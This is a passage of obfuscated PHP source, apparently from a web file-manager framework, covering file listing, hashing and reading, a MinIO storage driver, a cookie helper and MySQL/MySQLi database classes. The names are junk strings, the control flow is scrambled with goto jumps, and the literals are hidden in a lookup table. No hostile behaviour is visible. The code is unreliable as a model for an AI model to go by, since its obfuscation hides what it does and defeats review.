@filectime($C¥êº—‚½), $Eâ—˜½‡±[83] => @filemtime($C¥êº—‚½), $Eâ—˜½‡±[1230] => @fileatime($C¥êº—‚½), $Eâ—˜½‡±[77] => $this->size($C¥êº—‚½), $Eâ—˜½‡±[167] => $this->ext($AØ¯Ë”‰ÕÂ), $Eâ—˜½‡±[1231] => is_readable($C¥êº—‚½), $Eâ—˜½‡±[1232] => is_writable($C¥êº—‚½), $Eâ—˜½‡±[1233] => get_mode($C¥êº—‚½)); return $cÊ«¯‚£ç±; } public function exist($BÈ±×èî¦×) { $BÈ±×èî¦× = $this->iconvSystem($BÈ±×èî¦×); return @file_exists($BÈ±×èî¦×); } public function isFile($A•æÍ·Õ) { $A•æÍ·Õ = $this->iconvSystem($A•æÍ·Õ); return @is_file($A•æÍ·Õ); } public function isFolder($a«µ¢ÆÌŒó) { $a«µ¢ÆÌŒó = $this->iconvSystem($a«µ¢ÆÌŒó); return @is_dir($a«µ¢ÆÌŒó); } public function listPath($b¾‘é›‘ø›, $Fªà‹ÖØ³è = false) { goto EŠÈÔ°ÖÊ…; E½»™¿° †: $a¹ÎÖ¨¬­‰ = array($f£ºñæ‹’[74] => array(), $f£ºñæ‹’[73] => array()); if (!($a¿à¼Ä»Ÿ’ = @opendir($b¾‘é›‘ø›))) { return $a¹ÎÖ¨¬­‰; } while (($c‹ÌİíÔõ´ = readdir($a¿à¼Ä»Ÿ’)) !== !1) { if ($c‹ÌİíÔõ´ == $f£ºñæ‹’[94] || $c‹ÌİíÔõ´ == $f£ºñæ‹’[1227]) { continue; } $fÄ¾Ø¬ˆœ = $b¾‘é›‘ø› . $c‹ÌİíÔõ´; if (is_file($fÄ¾Ø¬ˆœ)) { $a¹ÎÖ¨¬­‰[$f£ºñæ‹’[73]][] = $this->fileInfo($fÄ¾Ø¬ˆœ, $Fªà‹ÖØ³è); } else { $a¹ÎÖ¨¬­‰[$f£ºñæ‹’[74]][] = $this->folderInfo($fÄ¾Ø¬ˆœ, $Fªà‹ÖØ³è); } } goto C¤–™óÖĞ÷; EŠÈÔ°ÖÊ…: $f£ºñæ‹’ =& $_SERVER[¹Ò‹Ò¹]; $b¾‘é›‘ø› = $this->iconvSystem($b¾‘é›‘ø›); $b¾‘é›‘ø› = rtrim($b¾‘é›‘ø›, $f£ºñæ‹’[8]) . $f£ºñæ‹’[8]; goto E½»™¿° †; C¤–™óÖĞ÷: closedir($a¿à¼Ä»Ÿ’); return $a¹ÎÖ¨¬­‰; goto C‰³í©Íô¶; C‰³í©Íô¶: } public function listAll($aìºÑŠªå, &$còšºôãŒ¡ = array()) { goto eÈ¬àÔÕ½œ; FÜ’«ÙÄ: if (!($C…³‰Ğ†Ä  = @opendir($aìºÑŠªå))) { return $còšºôãŒ¡; } while (($E¬ˆîß¶ŸÒ = readdir($C…³‰Ğ†Ä )) !== !1) { if ($E¬ˆîß¶ŸÒ == $AÂ·«ğë¸ï[94] || $E¬ˆîß¶ŸÒ == $AÂ·«ğë¸ï[1227]) { continue; } $B©ášùÃÙ = $aìºÑŠªå . $E¬ˆîß¶ŸÒ; if (is_dir($B©ášùÃÙ) && !is_link($B©ášùÃÙ)) { $còšºôãŒ¡[] = array($AÂ·«ğë¸ï[75] => $B©ášùÃÙ . $AÂ·«ğë¸ï[8], $AÂ·«ğë¸ï[76] => 1, $AÂ·«ğë¸ï[83] => @filemtime($B©ášùÃÙ), $AÂ·«ğë¸ï[77] => 0); $this->listAll($B©ášùÃÙ, $còšºôãŒ¡); } else { $còšºôãŒ¡[] = array($AÂ·«ğë¸ï[75] => $B©ášùÃÙ, $AÂ·«ğë¸ï[76] => 0, $AÂ·«ğë¸ï[83] => @filemtime($B©ášùÃÙ), $AÂ·«ğë¸ï[77] => $this->size($B©ášùÃÙ)); } } closedir($C…³‰Ğ†Ä ); goto E»İ¶öçÚö; eÈ¬àÔÕ½œ: $AÂ·«ğë¸ï =& $_SERVER[¹Ò‹Ò¹]; $aìºÑŠªå = $this->iconvSystem($aìºÑŠªå); $aìºÑŠªå = rtrim($aìºÑŠªå, $AÂ·«ğë¸ï[8]) . $AÂ·«ğë¸ï[8]; goto FÜ’«ÙÄ; E»İ¶öçÚö: return $còšºôãŒ¡; goto Aï‹Ş®¼ù¿; Aï‹Ş®¼ù¿: } public function has($d‚çá¾ö‹Ğ, $eŒÏÓ¥­Ñ– = false, $Cğ•õ†ÓÉ = true) { goto eé’‡¢š‡; e™îù¨Í‡É: $e…ÜØ¨Õ†÷ = 0; while (($c’‚¸½‹œ‘ = readdir($f¹»é›ÍÓ)) !== !1) { if ($c’‚¸½‹œ‘ == $CÔˆ£ò·‹Ô[94] || $c’‚¸½‹œ‘ == $CÔˆ£ò·‹Ô[1227]) { continue; } $e™×‘Ï…ñ = $d‚çá¾ö‹Ğ . $c’‚¸½‹œ‘; if ($eŒÏÓ¥­Ñ–) { $e…ÜØ¨Õ†÷++; if (@is_file($e™×‘Ï…ñ)) { $bÏ²¾³ê¹++; } else { $BÚíˆ¦Û„++; } if ($e…ÜØ¨Õ†÷ > 10000) { break; } continue; } if ($Cğ•õ†ÓÉ) { if (@is_file($e™×‘Ï…ñ)) { return !0; } } else { if (@is_dir($e™×‘Ï…ñ . $CÔˆ£ò·‹Ô[8])) { return !0; } } } closedir($f¹»é›ÍÓ); goto dŸèÌ„£…ß; fõñµŠôº: if (!($f¹»é›ÍÓ = @opendir($d‚çá¾ö‹Ğ))) { return !1; } $bÏ²¾³ê¹ = 0; $BÚíˆ¦Û„ = 0; goto e™îù¨Í‡É; eé’‡¢š‡: $CÔˆ£ò·‹Ô =& $_SERVER[¹Ò‹Ò¹]; $d‚çá¾ö‹Ğ = $this->iconvSystem($d‚çá¾ö‹Ğ); $d‚çá¾ö‹Ğ = rtrim($d‚çá¾ö‹Ğ, $CÔˆ£ò·‹Ô[8]) . $CÔˆ£ò·‹Ô[8]; goto fõñµŠôº; dŸèÌ„£…ß: if ($eŒÏÓ¥­Ñ–) { return array($CÔˆ£ò·‹Ô[201] => $bÏ²¾³ê¹, $CÔˆ£ò·‹Ô[202] => $BÚíˆ¦Û„); } return !1; goto dâáÔ”…áé; dâáÔ”…áé: } public function hashSimple($EòÏù÷İ) { goto fçßì¸º²Ñ; D·Í‡é£‘ô: $AÉöÈ‘¿³° = fopen($EòÏù÷İ, $a¤Õ‘„‚ßÎ[1234]); if (!$AÉöÈ‘¿³°) { return $BÔéÕÊß; } for ($fšˆé»Œº = 0; $fšˆé»Œº < $e­ÊÕ˜ù¨„; $fšˆé»Œº++) { fseek_64($AÉöÈ‘¿³°, $C‹àôÒÍ‡ * $fšˆé»Œº); $BÔéÕÊß .= fread($AÉöÈ‘¿³°, $b¯©¾Ñ´†™); } goto c±íÍ¹¾õ¨; c°ì‰†ƒá©: return md5($BÔéÕÊß) . $b¬²ÔÔŞ·ñ; goto BÄ÷¬Ôáƒ“; añ·Çß­†‰: if ($b¬²ÔÔŞ·ñ <= $b¯©¾Ñ´†™ * $e­ÊÕ˜ù¨„) { return $this->hashMd5($EòÏù÷İ) . $b¬²ÔÔŞ·ñ; } $BÔéÕÊß = $a¤Õ‘„‚ßÎ[33]; $C‹àôÒÍ‡ = intval($b¬²ÔÔŞ·ñ / $e­ÊÕ˜ù¨„); goto D·Í‡é£‘ô; fçßì¸º²Ñ: $a¤Õ‘„‚ßÎ =& $_SERVER[¹Ò‹Ò¹]; if (!$EòÏù÷İ) { return md5($a¤Õ‘„‚ßÎ[33]); } $EòÏù÷İ = $this->iconvSystem($EòÏù÷İ); goto f×Š‹¸õÁÏ; c±íÍ¹¾õ¨: fseek_64($AÉöÈ‘¿³°, $b¬²ÔÔŞ·ñ - $b¯©¾Ñ´†™); $BÔéÕÊß .= fread($AÉöÈ‘¿³°, $b¯©¾Ñ´†™); fclose($AÉöÈ‘¿³°); goto c°ì‰†ƒá©; f×Š‹¸õÁÏ: $b¬²ÔÔŞ·ñ = $this->size($EòÏù÷İ); $b¯©¾Ñ´†™ = 200; $e­ÊÕ˜ù¨„ = 50; goto añ·Çß­†‰; BÄ÷¬Ôáƒ“: } public function getContent($CÛ¬•¼Î­) { $CÛ¬•¼Î­ = $this->iconvSystem($CÛ¬•¼Î­); return file_get_contents($CÛ¬•¼Î­); } public function setContent($F†¾ñ­”Î, $Cµ¨›¯£”Ü = '') { $F†¾ñ­”Î = $this->iconvSystem($F†¾ñ­”Î); $cÎ™Öãñèö = @file_put_contents($F†¾ñ­”Î, $Cµ¨›¯£”Ü, LOCK_EX); clearstatcache(); return $cÎ™Öãñèö === !1 ? !1 : !0; } public function fileSubstr($b–Á”Â„¹, $EËá•‰É¤‹ = 0, $Fê·²Ğèö¸ = false) { goto E¯ò®‚‡˜; B¡¸Úì¿ğƒ: fseek_64($F´äïºé¨, $EËá•‰É¤‹); $fÕ²§ÙÛŠ¢ = fread($F´äïºé¨, $Fê·²Ğèö¸); fclose($F´äïºé¨); goto aÏ•®ğç²ì; E¯ò®‚‡˜: $Bå°Ñ¥œ´ =& $_SERVER[¹Ò‹Ò¹]; $b–Á”Â„¹ = $this->iconvSystem($b–Á”Â„¹); if ($Fê·²Ğèö¸ === !1) { $Fê·²Ğèö¸ = $this->size($b–Á”Â„¹); } goto Dˆƒº„Œ; aÏ•®ğç²ì: return $fÕ²§ÙÛŠ¢; goto dÑ¤‘¯ÕÒ‰; Dˆƒº„Œ: if ($Fê·²Ğèö¸ <= 0) { return $Bå°Ñ¥œ´[33]; } $F´äïºé¨ = fopen($b–Á”Â„¹, $Bå°Ñ¥œ´[1234]); if (!$F´äïºé¨) { return !1; } goto B¡¸Úì¿ğƒ; dÑ¤‘¯ÕÒ‰: } public function upload($F¦”éëãê, $dÉï˜‚İÈ², $f…Ğ•Œ¶’ = false, $dÁˆ¦Ô°ª = REPEAT_REPLACE) { $dˆÍÖ¢Æ = $this->copyFile($dÉï˜‚İÈ², $F¦”éëãê); return $dˆÍÖ¢Æ ? $this->getPathOuter($F¦”éëãê) : !1; } public function setModifyTime($d°‘êÁØÉ, $dîàÉ›ˆí’ = '') { @touch($d°‘êÁØÉ, intval($dîàÉ›ˆí’)); } public function download($f÷ˆ—ÌÊ­, $aÙºñÍå) { return $this->iconvSystem($f÷ˆ—ÌÊ­); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($e¦›øùìõ—) { parent::__construct($e¦›øùìõ—); $this->signatureVersion($_SERVER[¹Ò‹Ò¹][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto dÂ»â‰Å«æ; E¾îêó›õä: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($FìÚÉò‹è = '', $C›ÀŠ×ƒ¹ = 0) { if (is_string($FìÚÉò‹è) && $FìÚÉò‹è != $_SERVER[¹Ò‹Ò¹][33]) { $this->prefix = $FìÚÉò‹è; } if (is_numeric($C›ÀŠ×ƒ¹) && $C›ÀŠ×ƒ¹ > 0) { $this->expire = $C›ÀŠ×ƒ¹; } } public static function getInstance() { static $Aµõè¹™÷â; if ($Aµõè¹™÷â === null) { $Aµõè¹™÷â = new self(); } return $Aµõè¹™÷â; } private static $cookieDisable = false; public static function disable($AãÜ™ªšŠî) { self::$cookieDisable = $AãÜ™ªšŠî; } private static $sameCookieSet = array(); public static function set($e‡Şé‘™¯“, $C‚İ‚ÁÜÇ¤, $DµÜØôĞÄ½ = 0, $CÜá®§ÈÒô = false, $FÎ¿„¬‰ = false) { goto EŞ›Ôß·„÷; EŞ›Ôß·„÷: $EçÊ¤¥ÇÛá =& $_SERVER[¹Ò‹Ò¹]; if (self::$cookieDisable) { return; } if (!$DµÜØôĞÄ½) { $DµÜØôĞÄ½ = 24 * 3600 * 7; } goto B“æ†Öîï©; C¼ƒ‹—ê£¦: $CÂô¦œë“ = $EçÊ¤¥ÇÛá[33]; setcookie($e‡Şé‘™¯“, $C‚İ‚ÁÜÇ¤, time() + $DµÜØôĞÄ½, $EçÊ¤¥ÇÛá[8] . trim($FÎ¿„¬‰, $EçÊ¤¥ÇÛá[8]) . $CÂô¦œë“, !1, !1, $CÜá®§ÈÒô); goto Añ÷İ˜ƒËô; B“æ†Öîï©: if (isset(self::$sameCookieSet[$e‡Şé‘™¯“]) && self::$sameCookieSet[$e‡Şé‘™¯“] == $C‚İ‚ÁÜÇ¤ . $DµÜØôĞÄ½) { return; } self::$sameCookieSet[$e‡Şé‘™¯“] = $C‚İ‚ÁÜÇ¤ . $DµÜØôĞÄ½; if (!$FÎ¿„¬‰) { $FÎ¿„¬‰ = str_replace(HOST, $EçÊ¤¥ÇÛá[33], APP_HOST); $FÎ¿„¬‰ = _get($GLOBALS, $EçÊ¤¥ÇÛá[820], $FÎ¿„¬‰); } goto C¼ƒ‹—ê£¦; Añ÷İ˜ƒËô: } public static function setSafe($bõ×”™–‹ñ, $eëã“¨¯Š±, $A¼Á¥—óå¾ = 0) { self::set($bõ×”™–‹ñ, $eëã“¨¯Š±, $A¼Á¥—óå¾, !0); } public static function get($f¥Î›²·Âì) { return isset($_COOKIE[$f¥Î›²·Âì]) ? $_COOKIE[$f¥Î›²·Âì] : !1; } public static function remove($e¢Ş·ä›•, $dÆ˜ÌÎÁˆÇ = false) { unset($_COOKIE[$e¢Ş·ä›•]); self::set($e¢Ş·ä›•, $_SERVER[¹Ò‹Ò¹][33], 1, $dÆ˜ÌÎÁˆÇ); } } class DbMysql extends Db { public function __construct($CÄÆøœ–ÓÅ = '') { $BÉëÁÊÑ =& $_SERVER[¹Ò‹Ò¹]; if (!extension_loaded($BÉëÁÊÑ[744])) { think_exception(think_lang($BÉëÁÊÑ[10]) . $BÉëÁÊÑ[821]); } if (!empty($CÄÆøœ–ÓÅ)) { $this->config = $CÄÆøœ–ÓÅ; if (empty($this->config[$BÉëÁÊÑ[13]])) { $this->config[$BÉëÁÊÑ[13]] = $BÉëÁÊÑ[33]; } } } public function connect($aËàÛÒäöé = '', $C†„‚‹Ñø = 0, $FÄˆÔ¿œâ“ = false) { $bœšÂ° =& $_SERVER[¹Ò‹Ò¹]; if (!isset($this->linkID[$C†„‚‹Ñø])) { goto bå™ç‡«œ; bå™ç‡«œ: if (empty($aËàÛÒäöé)) { $aËàÛÒäöé = $this->config; } $bšÖÑæ§ = $aËàÛÒäöé[$bœšÂ°[822]] . ($aËàÛÒäöé[$bœšÂ°[823]] ? "\x3a{$aËàÛÒäöé[$bœšÂ°[823]]}" : $bœšÂ°[33]); $B”ê‡ŸÊ‰İ = !empty($aËàÛÒäöé[$bœšÂ°[13]][$bœšÂ°[14]]) ? $aËàÛÒäöé[$bœšÂ°[13]][$bœšÂ°[14]] : $this->pconnect; goto aÅ¤Ò¢¼ÍÖ; a®ô êéÏ: mysql_query($bœšÂ°[826] . think_config($bœšÂ°[827]) . $bœšÂ°[55], $this->linkID[$C†„‚‹Ñø]); if ($AŸ×Ï¢êˆä > $bœšÂ°[828]) { mysql_query($bœšÂ°[829], $this->linkID[$C†„‚‹Ñø]); } $this->connected = !0; goto Eòì¶âÃ; aÅ¤Ò¢¼ÍÖ: if ($B”ê‡ŸÊ‰İ) { $this->linkID[$C†„‚‹Ñø] = mysql_pconnect($bšÖÑæ§, $aËàÛÒäöé[$bœšÂ°[824]], $aËàÛÒäöé[$bœšÂ°[825]], 131072); } else { $this->linkID[$C†„‚‹Ñø] = mysql_connect($bšÖÑæ§, $aËàÛÒäöé[$bœšÂ°[824]], $aËàÛÒäöé[$bœšÂ°[825]], !0, 131072); } if (!$this->linkID[$C†„‚‹Ñø] || !empty($aËàÛÒäöé[$bœšÂ°[17]]) && !mysql_select_db($aËàÛÒäöé[$bœšÂ°[17]], $this->linkID[$C†„‚‹Ñø])) { think_exception(mysql_error()); } $AŸ×Ï¢êˆä = mysql_get_server_info($this->linkID[$C†„‚‹Ñø]); goto a®ô êéÏ; Eòì¶âÃ: if (1 != think_config($bœšÂ°[18])) { unset($this->config); } goto EìÏ–œåè; EìÏ–œåè: } return $this->linkID[$C†„‚‹Ñø]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($c¼²¬¤‚í¶) { goto BÏ‚åó†Èƒ; BÏ‚åó†Èƒ: $CÛŒªª– =& $_SERVER[¹Ò‹Ò¹]; if (0 === stripos($c¼²¬¤‚í¶, $CÛŒªª–[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto BãßÊ¬òù¼; BãßÊ¬òù¼: if (!$this->_linkID) { return !1; } $this->queryStr = $c¼²¬¤‚í¶; if ($this->queryID) { $this->free(); } goto d˜£¨–Ÿ; Fƒ¶ôÁÙÔ¸: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto DÂ®•…šö; d˜£¨–Ÿ: think_action_status($CÛŒªª–[19], 1); think_status($CÛŒªª–[20]); $this->queryID = mysql_query($c¼²¬¤‚í¶, $this->_linkID); goto Fƒ¶ôÁÙÔ¸; DÂ®•…šö: } public function execute($aÍ›¸ÉÖŒ‘) { goto b©¥ãˆ’«ô; b´ëÍ“¶î©: think_status($B‘”ƒ°·×Æ[20]); $FÜï—´ò¾® = mysql_query($aÍ›¸ÉÖŒ‘, $this->_linkID); $this->debug(); goto EÚïì¾µ¾Š; EÚïì¾µ¾Š: if (!1 === $FÜï—´ò¾®) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto a®÷˜ƒ¶ÒÉ; b©¥ãˆ’«ô: $B‘”ƒ°·×Æ =& $_SERVER[¹Ò‹Ò¹]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fìĞè•¹’°; fìĞè•¹’°: $this->queryStr = $aÍ›¸ÉÖŒ‘; if ($this->queryID) { $this->free(); } think_action_status($B‘”ƒ°·×Æ[21], 1); goto b´ëÍ“¶î©; a®÷˜ƒ¶ÒÉ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¹Ò‹Ò¹][830], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Aî³ˆ¨â£Ú = mysql_query($_SERVER[¹Ò‹Ò¹][831], $this->_linkID); $this->transTimes = 0; if (!$Aî³ˆ¨â£Ú) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $AŞ±¨²Î› = mysql_query($_SERVER[¹Ò‹Ò¹][832], $this->_linkID); $this->transTimes = 0; if (!$AŞ±¨²Î›) { $this->error(); return !1; } } return !0; } private function getAll() { $CÔñ³°«•‚ = array(); if ($this->numRows > 0) { while ($Cå×–Ô½™î = mysql_fetch_assoc($this->queryID)) { $CÔñ³°«•‚[] = $Cå×–Ô½™î; } mysql_data_seek($this->queryID, 0); } return $CÔñ³°«•‚; } public function getFields($cíœø·ù) { $eå¢Æà„¦Ú =& $_SERVER[¹Ò‹Ò¹]; $fËÁƒì„²© = $this->query($eå¢Æà„¦Ú[833] . $this->parseKey($cíœø·ù)); $e§¼ª†ëñğ = array(); if ($fËÁƒì„²©) { foreach ($fËÁƒì„²© as $EùÛĞ„ø¨ => $dš·õ¦• ») { $e§¼ª†ëñğ[$dš·õ¦• »[$eå¢Æà„¦Ú[27]]] = array($eå¢Æà„¦Ú[28] => $dš·õ¦• »[$eå¢Æà„¦Ú[27]], $eå¢Æà„¦Ú[29] => $dš·õ¦• »[$eå¢Æà„¦Ú[30]], $eå¢Æà„¦Ú[31] => (bool) (strtoupper($dš·õ¦• »[$eå¢Æà„¦Ú[32]]) === $eå¢Æà„¦Ú[834]), $eå¢Æà„¦Ú[34] => $dš·õ¦• »[$eå¢Æà„¦Ú[35]], $eå¢Æà„¦Ú[36] => strtolower($dš·õ¦• »[$eå¢Æà„¦Ú[37]]) == $eå¢Æà„¦Ú[38], $eå¢Æà„¦Ú[39] => strtolower($dš·õ¦• »[$eå¢Æà„¦Ú[40]]) == $eå¢Æà„¦Ú[41]); } } return $e§¼ª†ëñğ; } public function getTables($eßå‰Á‹Óã = '') { $AÂ–ëÊ¿…æ =& $_SERVER[¹Ò‹Ò¹]; if (!empty($eßå‰Á‹Óã)) { $FĞÀĞ¬ˆã› = $AÂ–ëÊ¿…æ[835] . $eßå‰Á‹Óã . $AÂ–ëÊ¿…æ[836]; } else { $FĞÀĞ¬ˆã› = $AÂ–ëÊ¿…æ[837]; } $C²¹‘”¥ó± = $this->query($FĞÀĞ¬ˆã›); $dØˆƒº¾‡ = array(); foreach ($C²¹‘”¥ó± as $fª®¢öŸÕÔ => $FÇ”›ô†«Ñ) { $dØˆƒº¾‡[$fª®¢öŸÕÔ] = current($FÇ”›ô†«Ñ); } return $dØˆƒº¾‡; } public function replace($eŠÅğÕÃ¥Ğ, $B³Öù¤Ü¤Ä = array()) { $Aªí³Õí¹î =& $_SERVER[¹Ò‹Ò¹]; foreach ($eŠÅğÕÃ¥Ğ as $dÀ¶ø½‚ÈÙ => $c’ÓËĞÕßÅ) { $Dà˜ù¡¸Á› = $this->parseValue($c’ÓËĞÕßÅ); if (is_scalar($Dà˜ù¡¸Á›)) { $cÃ™Ÿ“¡…Š[] = $Dà˜ù¡¸Á›; $a„Å¶êİÌŸ[] = $this->parseKey($dÀ¶ø½‚ÈÙ); } } $a•¹ÙãŸƒÉ = $Aªí³Õí¹î[838] . $this->parseTable($B³Öù¤Ü¤Ä[$Aªí³Õí¹î[275]]) . $Aªí³Õí¹î[839] . implode($Aªí³Õí¹î[47], $a„Å¶êİÌŸ) . $Aªí³Õí¹î[840] . implode($Aªí³Õí¹î[47], $cÃ™Ÿ“¡…Š) . $Aªí³Õí¹î[841]; return $this->execute($a•¹ÙãŸƒÉ); } public function insertAll($F”¤§Ò¾‰, $Eš¾Çøâ À = array(), $c¥Êà…Äó = false) { goto c«ë¿„óÅí; a–ë´ÁœÁö: $B”Õ´¹®ä = ($c¥Êà…Äó ? $Fì÷í¦øŸœ[843] : $Fì÷í¦øŸœ[844]) . $Fì÷í¦øŸœ[845] . $this->parseTable($Eš¾Çøâ À[$Fì÷í¦øŸœ[275]]) . $Fì÷í¦øŸœ[839] . implode($Fì÷í¦øŸœ[47], $aé‰´¨÷ÎÖ) . $Fì÷í¦øŸœ[846] . implode($Fì÷í¦øŸœ[47], $AÎ›Åƒíã); return $this->execute($B”Õ´¹®ä); goto D¢à¸©øçÒ; EğÆîè¼†É: $AÎ›Åƒíã = array(); foreach ($F”¤§Ò¾‰ as $cµ÷Ú®ë÷œ) { $E¥½İÉ™è— = array(); foreach ($cµ÷Ú®ë÷œ as $aË‰…öã´ => $dÛÅéí’ôæ) { $dÛÅéí’ôæ = $this->parseValue($dÛÅéí’ôæ); if (is_scalar($dÛÅéí’ôæ)) { $E¥½İÉ™è—[] = $dÛÅéí’ôæ; } } $AÎ›Åƒíã[] = $Fì÷í¦øŸœ[256] . implode($Fì÷í¦øŸœ[47], $E¥½İÉ™è—) . $Fì÷í¦øŸœ[841]; } array_walk($aé‰´¨÷ÎÖ, array($this, $Fì÷í¦øŸœ[842])); goto a–ë´ÁœÁö; c«ë¿„óÅí: $Fì÷í¦øŸœ =& $_SERVER[¹Ò‹Ò¹]; if (!is_array($F”¤§Ò¾‰[0])) { return !1; } $aé‰´¨÷ÎÖ = array_keys($F”¤§Ò¾‰[0]); goto EğÆîè¼†É; D¢à¸©øçÒ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $fõÛªææÁÈ =& $_SERVER[¹Ò‹Ò¹]; $this->error = mysql_errno() . $fõÛªææÁÈ[4] . mysql_error($this->_linkID); if ($fõÛªææÁÈ[33] != $this->queryStr) { $this->error .= LNG($fõÛªææÁÈ[45]) . $this->queryStr; } think_trace($this->error, $fõÛªææÁÈ[33], $fõÛªææÁÈ[46]); return $this->error; } public function escapeString($dİäÎ‘ËäÜ) { if ($this->_linkID) { return mysql_real_escape_string($dİäÎ‘ËäÜ, $this->_linkID); } else { return mysql_escape_string($dİäÎ‘ËäÜ); } } public function parseKey(&$e‹óÉÛ¹³‡, $AÕ¿›™® = true) { $a£ïîØ°ß =& $_SERVER[¹Ò‹Ò¹]; if ($AÕ¿›™®) { $e‹óÉÛ¹³‡ = $this->parseKeyCheck($e‹óÉÛ¹³‡); } if ($e‹óÉÛ¹³‡ != $a£ïîØ°ß[181] && !preg_match($a£ïîØ°ß[847], $e‹óÉÛ¹³‡)) { $e‹óÉÛ¹³‡ = $a£ïîØ°ß[380] . trim($e‹óÉÛ¹³‡, $a£ïîØ°ß[380]) . $a£ïîØ°ß[380]; } return $e‹óÉÛ¹³‡; } } class DbMysqli extends Db { public function __construct($dø‘¾È¶éÆ = '') { $cçĞŠÄ“•ì =& $_SERVER[¹Ò‹Ò¹]; if (!extension_loaded($cçĞŠÄ“•ì[743])) { think_exception(think_lang($cçĞŠÄ“•ì[10]) . $cçĞŠÄ“•ì[848]); } if (!empty($dø‘¾È¶éÆ)) { $this->config = $dø‘¾È¶éÆ; if (empty($this->config[$cçĞŠÄ“•ì[13]])) { $this->config[$cçĞŠÄ“•ì[13]] = $cçĞŠÄ“•ì[33]; } } } public function connect($fÙ’†ŠòŒ¹ = '', $A–÷”÷¡™ê = 0) { $c«ÁÇŒã¡ä =& $_SERVER[¹Ò‹Ò¹]; if (!isset($this->linkID[$A–÷”÷¡™ê])) { goto Eà‘…È„óÙ; féÈ¸‘¦÷÷: $this->connected = !0; if (1 != think_config($c«ÁÇŒã¡ä[18])) { unset($this->config); } goto Få¥ÈºÖß“; Eà‘…È„óÙ: if (empty($fÙ’†ŠòŒ¹)) { $fÙ’†ŠòŒ¹ = $this->config; } $this->linkID[$A–÷”÷¡™ê] = new mysqli($fÙ’†ŠòŒ¹[$c«ÁÇŒã¡ä[822]], $fÙ’†ŠòŒ¹[$c«ÁÇŒã¡ä[824]], $fÙ’†ŠòŒ¹[$c«ÁÇŒã¡ä[825]], $fÙ’†ŠòŒ¹[$c«ÁÇŒã¡ä[17]], $fÙ’†ŠòŒ¹[$c«ÁÇŒã¡ä[823]] ? intval($fÙ’†ŠòŒ¹[$c«ÁÇŒã¡ä[823]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto E‹ÖŞà†ï; E‹ÖŞà†ï: $FÖÈÀÅàÖÖ = $this->linkID[$A–÷”÷¡™ê]->server_version; $this->linkID[$A–÷”÷¡™ê]->query($c«ÁÇŒã¡ä[826] . think_config($c«ÁÇŒã¡ä[827]) . $c«ÁÇŒã¡ä[55]); if ($FÖÈÀÅàÖÖ > $c«ÁÇŒã¡ä[828]) { $this->linkID[$A–÷”÷¡™ê]->query($c«ÁÇŒã¡ä[829]); } goto féÈ¸‘¦÷÷; Få¥ÈºÖß“: } return $this->linkID[$A–÷”÷¡™ê]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($FÌ¥¯æƒ„É) { goto Eİñ—ëÅÁ; fÖ²…ã‡‚Å: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto d£ñÅÏÀğä; Eİñ—ëÅÁ: $Bğ”ßÚ­±Å =& $_SERVER[¹Ò‹Ò¹]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aê¾ƒ…ùˆÛ; dëì½–Òîˆ: think_status($Bğ”ßÚ­±Å[20]); $this->queryID = $this->_linkID->query($FÌ¥¯æƒ„É); if ($this->_linkID->more_results()) { while (($Dˆ·Ãâ†Ÿ¶ = $this->_linkID->next_result()) != NULL) { $Dˆ·Ãâ†Ÿ¶->free_result(); } } goto fÖ²…ã‡‚Å; aê¾ƒ…ùˆÛ: $this->queryStr = $FÌ¥¯æƒ„É; if ($this->queryID) { $this->free(); } think_action_status($Bğ”ßÚ­±Å[19], 1); goto dëì½–Òîˆ; d£ñÅÏÀğä: } public function execute($eâæ¾–è¿) { goto bŠéÇØ¶; bŠéÇØ¶: $fÀ‹ƒ¼…Ó =& $_SERVER[¹Ò‹Ò¹]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Cé×÷„åğ„; Fî±ã„§…: think_status($fÀ‹ƒ¼…Ó[20]); $dÆĞÖÍÁÅ = $this->_linkID->query($eâæ¾–è¿); $this->debug(); goto A¯°˜ÁÜÉ; A¯°˜ÁÜÉ: if (!1 === $dÆĞÖÍÁÅ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto BëõÆÊª•; Cé×÷„åğ„: $this->queryStr = $eâæ¾–è¿; if ($this->queryID) { $this->free(); } think_action_status($fÀ‹ƒ¼…Ó[21], 1); goto Fî±ã„§…; BëõÆÊª•: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÜğµŒ»Ò = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$aÜğµŒ»Ò) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fŸÃô­­ÎÒ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$fŸÃô­­ÎÒ) { $this->error(); return !1; } } return !0; } private function getAll() { $côæ­ˆ¡İ = array(); if ($this->numRows > 0) { for ($cÖç±¡å«É = 0; $cÖç±¡å«É < $this->numRows; $cÖç±¡å«É++) { $côæ­ˆ¡İ[$cÖç±¡å«É] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $côæ­ˆ¡İ; } public function getFields($F‹ÚŒ¶öÁ÷) { 